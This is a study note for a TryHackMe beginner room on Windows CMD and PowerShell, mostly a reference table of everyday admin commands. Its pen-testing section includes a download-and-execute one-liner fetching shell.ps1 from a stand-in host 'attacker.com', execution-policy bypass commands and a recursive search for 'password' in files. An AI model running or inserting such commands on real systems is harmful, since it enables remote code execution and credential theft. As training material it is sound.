---
tags: [THM, pre-security, operating-systems, windows, CLI, room]
platform: TryHackMe
type: room
module: "Operating Systems Basics"
module_number: 5
room_number: 21
status: "⬜"
url: https://tryhackme.com/room/windowsclibasics
difficulty: Easy
---

# 🪟 Windows CLI Basics

> [!abstract] Summary
> Master the Windows command line — both CMD and PowerShell. Essential for system administration, forensics, and post-exploitation in Windows environments.

**Path:** [[Pre Security (New)]] > [[Operating Systems Basics]] > Windows CLI Basics

---

## 📖 CMD vs PowerShell

| | CMD | PowerShell |
|---|---|---|
| **Type** | Legacy shell | Modern scripting shell |
| **Output** | Plain text | Objects |
| **Scripting** | Basic (.bat) | Advanced (.ps1) |
| **Security tools** | Limited | Extensive |
| **Pen testing** | Basic recon | Post-exploitation powerhouse |

> [!tip] PowerShell is the modern choice for security work on Windows — extensive capabilities and often less monitored than CMD.

---

## 🛠️ CMD Commands

### System Info
```cmd
hostname                    # Computer name
whoami                      # Current user
whoami /priv                # User privileges
whoami /groups              # Group memberships
systeminfo                  # Full system info
ver                         # OS version
```

### Navigation & Files
```cmd
dir                         # List files (like ls)
dir /a                      # Show hidden files
cd C:\Users\Alice           # Change directory
cd ..                       # Go up
type file.txt               # Print file (like cat)
copy source dest            # Copy file
move source dest            # Move/rename
del file.txt                # Delete file
mkdir newdir                # Create directory
rmdir /s /q directory       # Delete directory
```

### Network
```cmd
ipconfig                    # IP info (like ip a)
ipconfig /all               # Full details incl. MAC
ipconfig /release           # Release DHCP lease
ipconfig /renew             # Renew DHCP lease
ipconfig /flushdns          # Clear DNS cache
ping 8.8.8.8                # Test connectivity
tracert 8.8.8.8             # Trace route
netstat -ano                # Open connections + PID
nslookup tryhackme.com      # DNS lookup
arp -a                      # ARP cache
```

### Processes & Services
```cmd
tasklist                    # List processes
taskkill /PID 1234 /F       # Kill process
sc query                    # List services
sc start <service>          # Start service
sc stop <service>           # Stop service
net start                   # Running services
```

### Users
```cmd
net user                    # List users
net user alice              # User details
net localgroup              # List groups
net localgroup Administrators  # Group members
```

---

## 🛠️ PowerShell Commands

### Discovery & Info
```powershell
Get-Host                    # PS version
$PSVersionTable             # Detailed version info
Get-Process                 # Running processes
Get-Service                 # Services
Get-NetIPAddress            # IP addresses
Get-NetTCPConnection        # Open connections
Get-LocalUser               # Local users
Get-LocalGroup              # Local groups
```

### File Operations
```powershell
Get-ChildItem               # List files (alias: ls, dir)
Get-ChildItem -Hidden       # Include hidden
Set-Location C:\Users       # cd
Get-Content file.txt        # Read file (alias: cat)
Copy-Item source dest       # Copy
Move-Item source dest       # Move/rename
Remove-Item file.txt        # Delete
New-Item -Type File x.txt   # Create file
New-Item -Type Directory d  # Create directory
```

### Searching
```powershell
Get-ChildItem -Recurse -Filter "*.txt"  # Find files
Select-String "password" file.txt       # grep equivalent
Get-Content log.txt | Select-String "error"  # Pipe search
```

### Execution Policy
```powershell
Get-ExecutionPolicy                 # Check current policy
Set-ExecutionPolicy Bypass -Scope Process  # Bypass for session
powershell -ExecutionPolicy Bypass -File script.ps1
```

> [!warning] Security Note
> Attackers frequently use `ExecutionPolicy Bypass` to run malicious scripts. PowerShell logging (ScriptBlock logging) in event logs can detect this.

### One-Liners Useful in Pen Testing
```powershell
# Download and execute (common attack technique)
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')

# List scheduled tasks
Get-ScheduledTask | Where-Object {$_.TaskPath -notlike "\Microsoft*"}

# Find files containing "password"
Get-ChildItem -Recurse | Select-String "password" -ErrorAction SilentlyContinue
```

---

## 🔑 Key Takeaways
- CMD is legacy but still useful; PowerShell is the modern standard
- `whoami /priv` and `netstat -ano` are essential post-exploitation commands
- PowerShell is extremely powerful for both administration and attacks
- PowerShell execution policies can be bypassed — logging helps detect abuse

## 🔗 Related Notes
- [[Windows Basics]] · [[Linux CLI Basics]] · [[Operating System Security]]
- [[PowerShell]] · [[CMD]] · [[Windows]] · [[Post-Exploitation]] · [[Privilege Escalation]]
